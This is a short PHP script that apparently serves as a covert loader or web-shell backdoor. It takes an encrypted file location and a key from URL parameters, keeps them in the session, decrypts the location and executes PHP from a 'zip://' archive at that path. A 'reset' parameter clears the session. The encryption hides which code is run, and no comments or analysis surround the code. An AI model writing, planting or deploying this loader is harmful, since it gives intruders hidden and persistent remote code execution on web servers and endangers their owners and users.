<?php
session_start();
if (isset($_GET['reset'])) {
	session_unset();
session_destroy();
    exit;
}
function decrypt($data, $key,$method) {
    $data = base64_decode($data);
    $ivLength = openssl_cipher_iv_length($method);
    $iv = substr($data, 0, $ivLength);
    $encrypted = substr($data, $ivLength);
    return openssl_decrypt($encrypted, $method, $key, 0, $iv);
}

if ((isset($_SESSION['loc'])) and(isset($_SESSION['key'])))
{	require 'zip://'.decrypt($_SESSION['loc'],$_SESSION['key'],"AES-256-CBC");}
else
{
if ((isset($_GET['loc'])) and(isset($_GET['key'])))
{
$_SESSION['key']=trim($_GET['key']);
$_SESSION['loc']=trim($_GET['loc']);
require 'zip://'.decrypt($_SESSION['loc'],$_SESSION['key'],"AES-256-CBC");
}
}
?>
